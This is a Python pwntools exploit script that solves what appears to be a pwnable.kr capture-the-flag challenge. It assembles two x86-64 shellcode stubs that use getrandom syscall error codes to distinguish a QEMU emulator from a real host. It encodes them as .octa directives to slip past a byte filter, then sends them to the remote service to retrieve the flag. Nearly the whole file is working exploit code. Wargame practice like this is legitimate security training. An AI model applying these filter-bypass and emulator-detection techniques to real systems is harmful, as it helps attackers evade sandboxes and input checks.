#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 9013 ./nuclear
from pwn import *

# Set up pwntools for the correct architecture
exe = "./malware.py"
context.arch = "amd64"

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "pwnable.kr"
port = int(args.PORT or 9017)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
set follow-fork-mode parent
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

DO_GETRANDOM = """
mov ax, 318  # getrandom
syscall  # on remote qemu this returns -38, on host -22 (if edx (flags) is invalid)
"""

B = DO_GETRANDOM + """
add ax, 37  # on qemu this returns -1, on host 15 (if edx (flags) is invalid)
loop_start:
inc ax
jne loop_start  # loops ~ 0xffff on host, 0 on qemu
nop
"""


A = DO_GETRANDOM + """
add ax, 23  # on qemu this returns -15, on host 1 (if edx (flags) is invalid)
loop_start:
dec ax
jne loop_start  # loops 0 on host, on qemu ~ 0xffff
nop
"""

a_asm = asm(A)
b_asm = asm(B)
open("b", "wb").write(b_asm)

def encode_shellcode(shellcode: bytes) -> str:
    octas = [unpack(shellcode[i:i+16].ljust(16, b"\x00"), 128) for i in range(0, len(shellcode), 16)]
    output = f".octa {','.join(hex(o) for o in octas)}"
    assert len(output) == 40
    assert "80" not in output
    assert shellcode == asm(output)[:len(shellcode)]
    return output

encoded_shellcode_a = encode_shellcode(a_asm)
encoded_shellcode_b = encode_shellcode(b_asm)
info(f"A: {encoded_shellcode_a}, B: {encoded_shellcode_b}")

io = start()
io.sendlineafter(b"x64 asm code for function A: ", encoded_shellcode_a.encode())
io.sendlineafter(b"x64 asm code for function B: ", encoded_shellcode_b.encode())

info("waiting for flag...")

io.recvuntil(b"thanks for the help. here is reward :)\n")
success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")